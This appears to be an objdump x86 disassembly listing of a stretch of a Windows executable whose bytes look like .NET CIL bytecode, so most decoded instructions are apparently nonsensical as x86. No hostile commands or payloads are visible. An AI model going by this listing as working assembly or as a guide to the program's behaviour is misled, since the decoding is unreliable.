  4025bb:	06                   	push   %es
  4025bc:	00 16                	add    %dl,(%esi)
  4025be:	28 1a                	sub    %bl,(%edx)
  4025c0:	00 00                	add    %al,(%eax)
  4025c2:	06                   	push   %es
  4025c3:	00 14 fe             	add    %dl,(%esi,%edi,8)
  4025c6:	06                   	push   %es
  4025c7:	21 00                	and    %eax,(%eax)
  4025c9:	00 06                	add    %al,(%esi)
  4025cb:	73 35                	jae    0x402602
  4025cd:	00 00                	add    %al,(%eax)
  4025cf:	0a 14 73             	or     (%ebx,%esi,2),%dl
  4025d2:	21 00                	and    %eax,(%eax)
  4025d4:	00 0a                	add    %cl,(%edx)
  4025d6:	20 10                	and    %dl,(%eax)
  4025d8:	27                   	daa
  4025d9:	00 00                	add    %al,(%eax)
  4025db:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  4025e1:	2c 00                	sub    $0x0,%al
  4025e3:	00 0a                	add    %cl,(%edx)
  4025e5:	73 21                	jae    0x402608
  4025e7:	00 00                	add    %al,(%eax)
  4025e9:	0a 20                	or     (%eax),%ah
  4025eb:	10 27                	adc    %ah,(%edi)
  4025ed:	00 00                	add    %al,(%eax)
  4025ef:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  4025f5:	2c 00                	sub    $0x0,%al
  4025f7:	00 0a                	add    %cl,(%edx)
  4025f9:	73 36                	jae    0x402631
  4025fb:	00 00                	add    %al,(%eax)
  4025fd:	0a 28                	or     (%eax),%ch
  4025ff:	11 00                	adc    %eax,(%eax)
  402601:	00 06                	add    %al,(%esi)
  402603:	00 14 fe             	add    %dl,(%esi,%edi,8)
  402606:	06                   	push   %es
  402607:	22 00                	and    (%eax),%al
  402609:	00 06                	add    %al,(%esi)
  40260b:	73 35                	jae    0x402642
  40260d:	00 00                	add    %al,(%eax)
  40260f:	0a 14 17             	or     (%edi,%edx,1),%dl
  402612:	17                   	pop    %ss
  402613:	73 36                	jae    0x40264b
  402615:	00 00                	add    %al,(%eax)
  402617:	0a 28                	or     (%eax),%ch
  402619:	16                   	push   %ss
  40261a:	00 00                	add    %al,(%eax)
  40261c:	06                   	push   %es
  40261d:	00 28                	add    %ch,(%eax)
  40261f:	08 00                	or     %al,(%eax)
  402621:	00 06                	add    %al,(%esi)
  402623:	28 0a                	sub    %cl,(%edx)
  402625:	00 00                	add    %al,(%eax)
  402627:	06                   	push   %es
  402628:	28 0e                	sub    %cl,(%esi)
  40262a:	00 00                	add    %al,(%eax)
  40262c:	06                   	push   %es
  40262d:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402633:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  40263a:	06                   	push   %es
  40263b:	73 37                	jae    0x402674
  40263d:	00 00                	add    %al,(%eax)
  40263f:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402642:	38 00                	cmp    %al,(%eax)
  402644:	00 0a                	add    %cl,(%edx)
  402646:	26 00 2b             	add    %ch,%es:(%ebx)
  402649:	0a 00                	or     (%eax),%al
  40264b:	16                   	push   %ss
  40264c:	28 13                	sub    %dl,(%ebx)
  40264e:	00 00                	add    %al,(%eax)
  402650:	06                   	push   %es
  402651:	00 de                	add    %bl,%dh
  402653:	19 00                	sbb    %eax,(%eax)
  402655:	de 16                	ficoms (%esi)
  402657:	26 00 72 ff          	add    %dh,%es:-0x1(%edx)
  40265b:	00 00                	add    %al,(%eax)
  40265d:	70 28                	jo     0x402687
  40265f:	2e 00 00             	add    %al,%cs:(%eax)
  402662:	0a 00                	or     (%eax),%al
  402664:	16                   	push   %ss
  402665:	28 13                	sub    %dl,(%ebx)
  402667:	00 00                	add    %al,(%eax)
  402669:	06                   	push   %es
  40266a:	00 de                	add    %bl,%dh
  40266c:	00 2a                	add    %ch,(%edx)
  40266e:	00 00                	add    %al,(%eax)
  402670:	41                   	inc    %ecx
  402671:	4c                   	dec    %esp
  402672:	00 00                	add    %al,(%eax)
  402674:	00 00                	add    %al,(%eax)
  402676:	00 00                	add    %al,(%eax)
  402678:	d9 00                	flds   (%eax)
  40267a:	00 00                	add    %al,(%eax)
  40267c:	24 00                	and    $0x0,%al
  40267e:	00 00                	add    %al,(%eax)
  402680:	fd                   	std
  402681:	00 00                	add    %al,(%eax)
  402683:	00 05 00 00 00 0f    	add    %al,0xf000000
  402689:	00 00                	add    %al,(%eax)
  40268b:	01 02                	add    %eax,(%edx)
  40268d:	00 00                	add    %al,(%eax)
  40268f:	00 31                	add    %dh,(%ecx)
  402691:	01 00                	add    %eax,(%eax)
  402693:	00 7f 00             	add    %bh,0x0(%edi)
  402696:	00 00                	add    %al,(%eax)
  402698:	b0 01                	mov    $0x1,%al
  40269a:	00 00                	add    %al,(%eax)
  40269c:	0d 00 00 00 00       	or     $0x0,%eax
  4026a1:	00 00                	add    %al,(%eax)
  4026a3:	00 00                	add    %al,(%eax)
  4026a5:	00 00                	add    %al,(%eax)
  4026a7:	00 01                	add    %al,(%ecx)
  4026a9:	00 00                	add    %al,(%eax)
  4026ab:	00 06                	add    %al,(%esi)
  4026ad:	03 00                	add    (%eax),%eax
  4026af:	00 07                	add    %al,(%edi)
  4026b1:	03 00                	add    (%eax),%eax
  4026b3:	00 16                	add    %dl,(%esi)
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 0f                	add    %cl,(%edi)
  4026b9:	00 00                	add    %al,(%eax)
  4026bb:	01 13                	add    %edx,(%ebx)
  4026bd:	30 02                	xor    %al,(%edx)
  4026bf:	00 0f                	add    %cl,(%edi)
  4026c1:	00 00                	add    %al,(%eax)
  4026c3:	00 02                	add    %al,(%edx)
  4026c5:	00 00                	add    %al,(%eax)
  4026c7:	11 00                	adc    %eax,(%eax)
  4026c9:	02 28                	add    (%eax),%ch
  4026cb:	39 00                	cmp    %eax,(%eax)
  4026cd:	00 0a                	add    %cl,(%edx)
  4026cf:	16                   	push   %ss
  4026d0:	fe 03                	incb   (%ebx)
  4026d2:	0a 2b                	or     (%ebx),%ch
  4026d4:	00 06                	add    %al,(%esi)
  4026d6:	2a 00                	sub    (%eax),%al
  4026d8:	13 30                	adc    (%eax),%esi
  4026da:	02 00                	add    (%eax),%al
  4026dc:	07                   	pop    %es
  4026dd:	00 00                	add    %al,(%eax)
  4026df:	00 02                	add    %al,(%edx)
  4026e1:	00 00                	add    %al,(%eax)
  4026e3:	11 00                	adc    %eax,(%eax)
  4026e5:	17                   	pop    %ss
  4026e6:	0a 2b                	or     (%ebx),%ch
  4026e8:	00 06                	add    %al,(%esi)
  4026ea:	2a 00                	sub    (%eax),%al
  4026ec:	1b 30                	sbb    (%eax),%esi
  4026ee:	02 00                	add    (%eax),%al
  4026f0:	56                   	push   %esi
	...
  4026f9:	00 28                	add    %ch,(%eax)
  4026fb:	08 00                	or     %al,(%eax)
  4026fd:	00 06                	add    %al,(%esi)
  4026ff:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  402704:	06                   	push   %es
  402705:	28 3a                	sub    %bh,(%edx)
  402707:	00 00                	add    %al,(%eax)
  402709:	0a 00                	or     (%eax),%al
  40270b:	28 06                	sub    %al,(%esi)
  40270d:	00 00                	add    %al,(%eax)
  40270f:	06                   	push   %es
  402710:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  402715:	06                   	push   %es
  402716:	28 3b                	sub    %bh,(%ebx)
  402718:	00 00                	add    %al,(%eax)
  40271a:	0a 00                	or     (%eax),%al
  40271c:	28 15 00 00 06 25    	sub    %dl,0x25060000
  402722:	2d 03 26 2b 06       	sub    $0x62b2603,%eax
  402727:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  40272a:	00 0a                	add    %cl,(%edx)
  40272c:	00 28                	add    %ch,(%eax)
  40272e:	10 00                	adc    %al,(%eax)
  402730:	00 06                	add    %al,(%esi)
  402732:	25 2d 03 26 2b       	and    $0x2b26032d,%eax
  402737:	06                   	push   %es
  402738:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  40273b:	00 0a                	add    %cl,(%edx)
  40273d:	00 00                	add    %al,(%eax)
  40273f:	de 05 26 00 00 de    	fiadds 0xde000026
  402745:	00 16                	add    %dl,(%esi)
  402747:	28 13                	sub    %dl,(%ebx)
  402749:	00 00                	add    %al,(%eax)
  40274b:	06                   	push   %es
  40274c:	00 2a                	add    %ch,(%edx)
  40274e:	00 00                	add    %al,(%eax)
  402750:	01 10                	add    %edx,(%eax)
  402752:	00 00                	add    %al,(%eax)
  402754:	00 00                	add    %al,(%eax)
  402756:	01 00                	add    %eax,(%eax)
  402758:	48                   	dec    %eax
  402759:	49                   	dec    %ecx
  40275a:	00 05 0f 00 00 01    	add    %al,0x100000f
  402760:	1b 30                	sbb    (%eax),%esi
  402762:	06                   	push   %es
  402763:	00 20                	add    %ah,(%eax)
  402765:	02 00                	add    (%eax),%al
  402767:	00 05 00 00 11 00    	add    %al,0x110000
  40276d:	00 28                	add    %ch,(%eax)
  40276f:	06                   	push   %es
  402770:	00 00                	add    %al,(%eax)
  402772:	06                   	push   %es
  402773:	6f                   	outsl  %ds:(%esi),(%dx)
  402774:	25 00 00 0a 2c       	and    $0x2c0a0000,%eax
  402779:	0a 28                	or     (%eax),%ch
  40277b:	12 00                	adc    (%eax),%al
  40277d:	00 06                	add    %al,(%esi)
  40277f:	16                   	push   %ss
  402780:	fe 01                	incb   (%ecx)
  402782:	2b 01                	sub    (%ecx),%eax
  402784:	17                   	pop    %ss
  402785:	0b 07                	or     (%edi),%eax
  402787:	2c 0d                	sub    $0xd,%al
  402789:	00 16                	add    %dl,(%esi)
  40278b:	28 13                	sub    %dl,(%ebx)
  40278d:	00 00                	add    %al,(%eax)
  40278f:	06                   	push   %es
  402790:	00 dd                	add    %bl,%ch
  402792:	f5                   	cmc
  402793:	01 00                	add    %eax,(%eax)
  402795:	00 28                	add    %ch,(%eax)
  402797:	08 00                	or     %al,(%eax)
  402799:	00 06                	add    %al,(%esi)
  40279b:	02 6f 3d             	add    0x3d(%edi),%ch
  40279e:	00 00                	add    %al,(%eax)
  4027a0:	0a 0a                	or     (%edx),%cl
  4027a2:	06                   	push   %es
  4027a3:	16                   	push   %ss
  4027a4:	fe 02                	incb   (%edx)
  4027a6:	0c 08                	or     $0x8,%al
  4027a8:	39 c6                	cmp    %eax,%esi
  4027aa:	01 00                	add    %eax,(%eax)
  4027ac:	00 00                	add    %al,(%eax)
  4027ae:	28 0e                	sub    %cl,(%esi)
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	06                   	push   %es
  4027b3:	06                   	push   %es
  4027b4:	6a 58                	push   $0x58
  4027b6:	28 0f                	sub    %cl,(%edi)
  4027b8:	00 00                	add    %al,(%eax)
  4027ba:	06                   	push   %es
  4027bb:	00 28                	add    %ch,(%eax)
  4027bd:	0c 00                	or     $0x0,%al
  4027bf:	00 06                	add    %al,(%esi)
  4027c1:	06                   	push   %es
  4027c2:	6a 59                	push   $0x59
  4027c4:	28 0d 00 00 06 00    	sub    %cl,0x60000
  4027ca:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4027cd:	00 06                	add    %al,(%esi)
  4027cf:	16                   	push   %ss
  4027d0:	6a fe                	push   $0xfffffffe
  4027d2:	01 0d 09 39 54 01    	add    %ecx,0x1543909
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	00 28                	add    %ch,(%eax)
  4027dc:	0a 00                	or     (%eax),%al
  4027de:	00 06                	add    %al,(%esi)
  4027e0:	16                   	push   %ss
  4027e1:	28 3e                	sub    %bh,(%esi)
  4027e3:	00 00                	add    %al,(%eax)
  4027e5:	0a 6a 28             	or     0x28(%edx),%ch
  4027e8:	0d 00 00 06 00       	or     $0x60000,%eax
  4027ed:	72 1b                	jb     0x40280a
  4027ef:	01 00                	add    %eax,(%eax)
  4027f1:	70 28                	jo     0x40281b
  4027f3:	0c 00                	or     $0x0,%al
  4027f5:	00 06                	add    %al,(%esi)
  4027f7:	13 04 12             	adc    (%edx,%edx,1),%eax
  4027fa:	04 28                	add    $0x28,%al
  4027fc:	3f                   	aas
  4027fd:	00 00                	add    %al,(%eax)
  4027ff:	0a 72 49             	or     0x49(%edx),%dh
  402802:	01 00                	add    %eax,(%eax)
  402804:	70 28                	jo     0x40282e
  402806:	40                   	inc    %eax
  402807:	00 00                	add    %al,(%eax)
  402809:	0a 28                	or     (%eax),%ch
  40280b:	2e 00 00             	add    %al,%cs:(%eax)
  40280e:	0a 00                	or     (%eax),%al
  402810:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402813:	00 06                	add    %al,(%esi)
  402815:	16                   	push   %ss
  402816:	6a fe                	push   $0xfffffffe
  402818:	02 13                	add    (%ebx),%dl
  40281a:	05 11 05 39 e6       	add    $0xe6390511,%eax
  40281f:	00 00                	add    %al,(%eax)
  402821:	00 00                	add    %al,(%eax)
  402823:	16                   	push   %ss
  402824:	6a 28                	push   $0x28
  402826:	0f 00 00             	sldt   (%eax)
  402829:	06                   	push   %es
  40282a:	00 28                	add    %ch,(%eax)
  40282c:	0c 00                	or     $0x0,%al
  40282e:	00 06                	add    %al,(%esi)
  402830:	d4 8d                	aam    $0x8d
  402832:	59                   	pop    %ecx
  402833:	00 00                	add    %al,(%eax)
  402835:	01 28                	add    %ebp,(%eax)
  402837:	0b 00                	or     (%eax),%eax
  402839:	00 06                	add    %al,(%esi)
  40283b:	00 2b                	add    %ch,(%ebx)
  40283d:	74 00                	je     0x40283f
  40283f:	28 08                	sub    %cl,(%eax)
  402841:	00 00                	add    %al,(%eax)
  402843:	06                   	push   %es
  402844:	28 0a                	sub    %cl,(%edx)
  402846:	00 00                	add    %al,(%eax)
  402848:	06                   	push   %es
  402849:	28 0e                	sub    %cl,(%esi)
  40284b:	00 00                	add    %al,(%eax)
  40284d:	06                   	push   %es
  40284e:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402854:	69 6f 41 00 00 0a 13 	imul   $0x130a0000,0x41(%edi),%ebp
  40285b:	07                   	pop    %es
  40285c:	11 07                	adc    %eax,(%edi)
  40285e:	16                   	push   %ss
  40285f:	fe 02                	incb   (%edx)
  402861:	16                   	push   %ss
  402862:	fe 01                	incb   (%ecx)
  402864:	13 08                	adc    (%eax),%ecx
  402866:	11 08                	adc    %ecx,(%eax)
  402868:	2c 0d                	sub    $0xd,%al
  40286a:	00 16                	add    %dl,(%esi)
  40286c:	28 13                	sub    %dl,(%ebx)
  40286e:	00 00                	add    %al,(%eax)
  402870:	06                   	push   %es
  402871:	00 dd                	add    %bl,%ch
  402873:	14 01                	adc    $0x1,%al
  402875:	00 00                	add    %al,(%eax)
  402877:	28 0e                	sub    %cl,(%esi)
  402879:	00 00                	add    %al,(%eax)
  40287b:	06                   	push   %es
  40287c:	11 07                	adc    %eax,(%edi)
  40287e:	6a 58                	push   $0x58
  402880:	28 0f                	sub    %cl,(%edi)
  402882:	00 00                	add    %al,(%eax)
  402884:	06                   	push   %es
  402885:	00 28                	add    %ch,(%eax)
  402887:	0c 00                	or     $0x0,%al
  402889:	00 06                	add    %al,(%esi)
  40288b:	11 07                	adc    %eax,(%edi)
  40288d:	6a 59                	push   $0x59
  40288f:	28 0d 00 00 06 00    	sub    %cl,0x60000
  402895:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402898:	00 06                	add    %al,(%esi)
  40289a:	16                   	push   %ss
  40289b:	6a fe                	push   $0xfffffffe
  40289d:	04 13                	add    $0x13,%al
  40289f:	09 11                	or     %edx,(%ecx)
  4028a1:	09 2c 0d 00 16 28 13 	or     %ebp,0x13281600(,%ecx,1)
  4028a8:	00 00                	add    %al,(%eax)
  4028aa:	06                   	push   %es
  4028ab:	00 dd                	add    %bl,%ch
  4028ad:	da 00                	fiaddl (%eax)
  4028af:	00 00                	add    %al,(%eax)
  4028b1:	00 28                	add    %ch,(%eax)
  4028b3:	0c 00                	or     $0x0,%al
  4028b5:	00 06                	add    %al,(%esi)
  4028b7:	16                   	push   %ss
  4028b8:	6a fe                	push   $0xfffffffe
  4028ba:	02 13                	add    (%ebx),%dl
  4028bc:	0a 11                	or     (%ecx),%dl
  4028be:	0a 3a                	or     (%edx),%bh
  4028c0:	7a ff                	jp     0x4028c1
  4028c2:	ff                   	(bad)
  4028c3:	ff 14 fe             	call   *(%esi,%edi,8)
  4028c6:	06                   	push   %es
  4028c7:	46                   	inc    %esi
  4028c8:	00 00                	add    %al,(%eax)
  4028ca:	06                   	push   %es
  4028cb:	73 42                	jae    0x40290f
  4028cd:	00 00                	add    %al,(%eax)
  4028cf:	0a 73 43             	or     0x43(%ebx),%dh
  4028d2:	00 00                	add    %al,(%eax)
  4028d4:	0a 13                	or     (%ebx),%dl
  4028d6:	06                   	push   %es
  4028d7:	11 06                	adc    %eax,(%esi)
  4028d9:	28 0a                	sub    %cl,(%edx)
  4028db:	00 00                	add    %al,(%eax)
  4028dd:	06                   	push   %es
  4028de:	6f                   	outsl  %ds:(%esi),(%dx)
  4028df:	44                   	inc    %esp
  4028e0:	00 00                	add    %al,(%eax)
  4028e2:	0a 00                	or     (%eax),%al
  4028e4:	16                   	push   %ss
  4028e5:	6a 28                	push   $0x28
  4028e7:	0f 00 00             	sldt   (%eax)
  4028ea:	06                   	push   %es
  4028eb:	00 1a                	add    %bl,(%edx)
  4028ed:	6a 28                	push   $0x28
  4028ef:	0d 00 00 06 00       	or     $0x60000,%eax
  4028f4:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  4028f7:	00 06                	add    %al,(%esi)
  4028f9:	d4 8d                	aam    $0x8d
  4028fb:	59                   	pop    %ecx
  4028fc:	00 00                	add    %al,(%eax)
  4028fe:	01 28                	add    %ebp,(%eax)
  402900:	0b 00                	or     (%eax),%eax
  402902:	00 06                	add    %al,(%esi)
  402904:	00 00                	add    %al,(%eax)
  402906:	2b 23                	sub    (%ebx),%esp
  402908:	00 1a                	add    %bl,(%edx)
  40290a:	6a 28                	push   $0x28
  40290c:	0d 00 00 06 00       	or     $0x60000,%eax
  402911:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402914:	00 06                	add    %al,(%esi)
  402916:	d4 8d                	aam    $0x8d
  402918:	59                   	pop    %ecx
  402919:	00 00                	add    %al,(%eax)
  40291b:	01 28                	add    %ebp,(%eax)
  40291d:	0b 00                	or     (%eax),%eax
  40291f:	00 06                	add    %al,(%esi)
  402921:	00 16                	add    %dl,(%esi)
  402923:	6a 28                	push   $0x28
  402925:	0f 00 00             	sldt   (%eax)
  402928:	06                   	push   %es
  402929:	00 00                	add    %al,(%eax)
  40292b:	00 2b                	add    %ch,(%ebx)
  40292d:	19 28                	sbb    %ebp,(%eax)
  40292f:	0c 00                	or     $0x0,%al
  402931:	00 06                	add    %al,(%esi)
  402933:	16                   	push   %ss
  402934:	6a fe                	push   $0xfffffffe
  402936:	04 13                	add    $0x13,%al
  402938:	0b 11                	or     (%ecx),%edx
  40293a:	0b 2c 0a             	or     (%edx,%ecx,1),%ebp
  40293d:	00 16                	add    %dl,(%esi)
  40293f:	28 13                	sub    %dl,(%ebx)
  402941:	00 00                	add    %al,(%eax)
  402943:	06                   	push   %es
  402944:	00 de                	add    %bl,%dh
  402946:	44                   	inc    %esp
  402947:	28 08                	sub    %cl,(%eax)
  402949:	00 00                	add    %al,(%eax)
  40294b:	06                   	push   %es
  40294c:	28 0a                	sub    %cl,(%edx)
  40294e:	00 00                	add    %al,(%eax)
  402950:	06                   	push   %es
  402951:	28 0e                	sub    %cl,(%esi)
  402953:	00 00                	add    %al,(%eax)
  402955:	06                   	push   %es
  402956:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  40295c:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402963:	06                   	push   %es
  402964:	73 37                	jae    0x40299d
  402966:	00 00                	add    %al,(%eax)
  402968:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  40296b:	38 00                	cmp    %al,(%eax)
  40296d:	00 0a                	add    %cl,(%edx)
  40296f:	26 00 2b             	add    %ch,%es:(%ebx)
  402972:	0a 00                	or     (%eax),%al
  402974:	16                   	push   %ss
  402975:	28 13                	sub    %dl,(%ebx)
  402977:	00 00                	add    %al,(%eax)
  402979:	06                   	push   %es
  40297a:	00 de                	add    %bl,%dh
  40297c:	0e                   	push   %cs
  40297d:	00 de                	add    %bl,%dh
  40297f:	0b 26                	or     (%esi),%esp
  402981:	00 16                	add    %dl,(%esi)
  402983:	28 13                	sub    %dl,(%ebx)
  402985:	00 00                	add    %al,(%eax)
  402987:	06                   	push   %es
  402988:	00 de                	add    %bl,%dh
  40298a:	00 2a                	add    %ch,(%edx)
  40298c:	41                   	inc    %ecx
  40298d:	1c 00                	sbb    $0x0,%al
  40298f:	00 00                	add    %al,(%eax)
  402991:	00 00                	add    %al,(%eax)
  402993:	00 01                	add    %al,(%ecx)
  402995:	00 00                	add    %al,(%eax)
  402997:	00 13                	add    %dl,(%ebx)
  402999:	02 00                	add    (%eax),%al
  40299b:	00 14 02             	add    %dl,(%edx,%eax,1)
  40299e:	00 00                	add    %al,(%eax)
  4029a0:	0b 00                	or     (%eax),%eax
  4029a2:	00 00                	add    %al,(%eax)
  4029a4:	0f 00 00             	sldt   (%eax)
  4029a7:	01 1b                	add    %ebx,(%ebx)
  4029a9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4029ac:	2d 01 00 00 06       	sub    $0x6000001,%eax
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	11 00                	adc    %eax,(%eax)
  4029b5:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4029b8:	00 06                	add    %al,(%esi)
  4029ba:	0a 16                	or     (%esi),%dl
  4029bc:	0b 06                	or     (%esi),%eax
  4029be:	12 01                	adc    (%ecx),%al
  4029c0:	28 45 00             	sub    %al,0x0(%ebp)
  4029c3:	00 0a                	add    %cl,(%edx)
  4029c5:	00 00                	add    %al,(%eax)
  4029c7:	00 28                	add    %ch,(%eax)
  4029c9:	12 00                	adc    (%eax),%al
  4029cb:	00 06                	add    %al,(%esi)
  4029cd:	16                   	push   %ss
  4029ce:	fe 01                	incb   (%ecx)
  4029d0:	0d 09 2c 06 00       	or     $0x62c09,%eax
  4029d5:	dd 06                	fldl   (%esi)
  4029d7:	01 00                	add    %eax,(%eax)
  4029d9:	00 02                	add    %al,(%edx)
  4029db:	8e 69 28             	mov    0x28(%ecx),%gs
  4029de:	46                   	inc    %esi
  4029df:	00 00                	add    %al,(%eax)
  4029e1:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  4029e4:	06                   	push   %es
  4029e5:	00 00                	add    %al,(%eax)
  4029e7:	06                   	push   %es
  4029e8:	15 17 6f 47 00       	adc    $0x476f17,%eax
  4029ed:	00 0a                	add    %cl,(%edx)
  4029ef:	26 28 08             	sub    %cl,%es:(%eax)
  4029f2:	00 00                	add    %al,(%eax)
  4029f4:	06                   	push   %es
  4029f5:	08 16                	or     %dl,(%esi)
  4029f7:	08 8e 69 6f 48 00    	or     %cl,0x486f69(%esi)
  4029fd:	00 0a                	add    %cl,(%edx)
  4029ff:	00 02                	add    %al,(%edx)
  402a01:	8e 69 20             	mov    0x20(%ecx),%gs
  402a04:	40                   	inc    %eax
  402a05:	42                   	inc    %edx
  402a06:	0f 00                	(bad)
  402a08:	fe 02                	incb   (%edx)
  402a0a:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402a0d:	04 39                	add    $0x39,%al
  402a0f:	87 00                	xchg   %eax,(%eax)
  402a11:	00 00                	add    %al,(%eax)
  402a13:	00 72 61             	add    %dh,0x61(%edx)
  402a16:	01 00                	add    %eax,(%eax)
  402a18:	70 28                	jo     0x402a42
  402a1a:	2e 00 00             	add    %al,%cs:(%eax)
  402a1d:	0a 00                	or     (%eax),%al
  402a1f:	02 73 49             	add    0x49(%ebx),%dh
  402a22:	00 00                	add    %al,(%eax)
  402a24:	0a 13                	or     (%ebx),%dl
  402a26:	05 00 16 13 06       	add    $0x6131600,%eax
  402a2b:	11 05 16 6a 6f 4a    	adc    %eax,0x4a6f6a16
  402a31:	00 00                	add    %al,(%eax)
  402a33:	0a 00                	or     (%eax),%al
  402a35:	20 50 c3             	and    %dl,-0x3d(%eax)
  402a38:	00 00                	add    %al,(%eax)
  402a3a:	8d 59 00             	lea    0x0(%ecx),%ebx
  402a3d:	00 01                	add    %al,(%ecx)
  402a3f:	13 07                	adc    (%edi),%eax
  402a41:	2b 2a                	sub    (%edx),%ebp
  402a43:	00 28                	add    %ch,(%eax)
  402a45:	06                   	push   %es
  402a46:	00 00                	add    %al,(%eax)
  402a48:	06                   	push   %es
  402a49:	15 17 6f 47 00       	adc    $0x476f17,%eax
  402a4e:	00 0a                	add    %cl,(%edx)
  402a50:	26 28 08             	sub    %cl,%es:(%eax)
  402a53:	00 00                	add    %al,(%eax)
  402a55:	06                   	push   %es
  402a56:	11 07                	adc    %eax,(%edi)
  402a58:	16                   	push   %ss
  402a59:	11 06                	adc    %eax,(%esi)
  402a5b:	6f                   	outsl  %ds:(%esi),(%dx)
  402a5c:	48                   	dec    %eax
  402a5d:	00 00                	add    %al,(%eax)
  402a5f:	0a 00                	or     (%eax),%al
  402a61:	28 08                	sub    %cl,(%eax)
  402a63:	00 00                	add    %al,(%eax)
  402a65:	06                   	push   %es
  402a66:	6f                   	outsl  %ds:(%esi),(%dx)
  402a67:	4b                   	dec    %ebx
  402a68:	00 00                	add    %al,(%eax)
  402a6a:	0a 00                	or     (%eax),%al
  402a6c:	00 11                	add    %dl,(%ecx)
  402a6e:	05 11 07 16 11       	add    $0x11160711,%eax
  402a73:	07                   	pop    %es
  402a74:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402a77:	41                   	inc    %ecx
  402a78:	00 00                	add    %al,(%eax)
  402a7a:	0a 25 13 06 16 fe    	or     0xfe160613,%ah
  402a80:	02 13                	add    (%ebx),%dl
  402a82:	08 11                	or     %dl,(%ecx)
  402a84:	08 2d bc 00 de 0d    	or     %ch,0xdde00bc
  402a8a:	11 05 2c 08 11 05    	adc    %eax,0x511082c
  402a90:	6f                   	outsl  %ds:(%esi),(%dx)
  402a91:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402a96:	dc 00                	faddl  (%eax)
  402a98:	2b 2a                	sub    (%edx),%ebp
  402a9a:	00 28                	add    %ch,(%eax)
  402a9c:	06                   	push   %es
  402a9d:	00 00                	add    %al,(%eax)
  402a9f:	06                   	push   %es
  402aa0:	15 17 6f 47 00       	adc    $0x476f17,%eax
  402aa5:	00 0a                	add    %cl,(%edx)
  402aa7:	26 28 08             	sub    %cl,%es:(%eax)
  402aaa:	00 00                	add    %al,(%eax)
  402aac:	06                   	push   %es
  402aad:	02 16                	add    (%esi),%dl
  402aaf:	02 8e 69 6f 48 00    	add    0x486f69(%esi),%cl
  402ab5:	00 0a                	add    %cl,(%edx)
  402ab7:	00 28                	add    %ch,(%eax)
  402ab9:	08 00                	or     %al,(%eax)
  402abb:	00 06                	add    %al,(%esi)
  402abd:	6f                   	outsl  %ds:(%esi),(%dx)
  402abe:	4b                   	dec    %ebx
  402abf:	00 00                	add    %al,(%eax)
  402ac1:	0a 00                	or     (%eax),%al
  402ac3:	00 00                	add    %al,(%eax)
  402ac5:	de 0b                	fimuls (%ebx)
  402ac7:	26 00 16             	add    %dl,%es:(%esi)
  402aca:	28 13                	sub    %dl,(%ebx)
  402acc:	00 00                	add    %al,(%eax)
  402ace:	06                   	push   %es
  402acf:	00 de                	add    %bl,%dh
  402ad1:	0e                   	push   %cs
  402ad2:	00 de                	add    %bl,%dh
  402ad4:	0b 07                	or     (%edi),%eax
  402ad6:	2c 07                	sub    $0x7,%al
  402ad8:	06                   	push   %es
  402ad9:	28 4c 00 00          	sub    %cl,0x0(%eax,%eax,1)
  402add:	0a 00                	or     (%eax),%al
  402adf:	dc 2a                	fsubrl (%edx)
  402ae1:	00 00                	add    %al,(%eax)
  402ae3:	00 41 4c             	add    %al,0x4c(%ecx)
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	02 00                	add    (%eax),%al
  402aea:	00 00                	add    %al,(%eax)
  402aec:	73 00                	jae    0x402aee
  402aee:	00 00                	add    %al,(%eax)
  402af0:	63 00                	arpl   %eax,(%eax)
  402af2:	00 00                	add    %al,(%eax)
  402af4:	d6                   	salc
  402af5:	00 00                	add    %al,(%eax)
  402af7:	00 0d 00 00 00 00    	add    %cl,0x0
  402afd:	00 00                	add    %al,(%eax)
  402aff:	00 00                	add    %al,(%eax)
  402b01:	00 00                	add    %al,(%eax)
  402b03:	00 13                	add    %dl,(%ebx)
  402b05:	00 00                	add    %al,(%eax)
  402b07:	00 00                	add    %al,(%eax)
  402b09:	01 00                	add    %eax,(%eax)
  402b0b:	00 13                	add    %dl,(%ebx)
  402b0d:	01 00                	add    %eax,(%eax)
  402b0f:	00 0b                	add    %cl,(%ebx)
  402b11:	00 00                	add    %al,(%eax)
  402b13:	00 0f                	add    %cl,(%edi)
  402b15:	00 00                	add    %al,(%eax)
  402b17:	01 02                	add    %eax,(%edx)
  402b19:	00 00                	add    %al,(%eax)
  402b1b:	00 09                	add    %cl,(%ecx)
  402b1d:	00 00                	add    %al,(%eax)
  402b1f:	00 18                	add    %bl,(%eax)
  402b21:	01 00                	add    %eax,(%eax)
  402b23:	00 21                	add    %ah,(%ecx)
  402b25:	01 00                	add    %eax,(%eax)
  402b27:	00 0b                	add    %cl,(%ebx)
  402b29:	00 00                	add    %al,(%eax)
  402b2b:	00 00                	add    %al,(%eax)
  402b2d:	00 00                	add    %al,(%eax)
  402b2f:	00 1b                	add    %bl,(%ebx)
  402b31:	30 02                	xor    %al,(%edx)
  402b33:	00 56 00             	add    %dl,0x0(%esi)
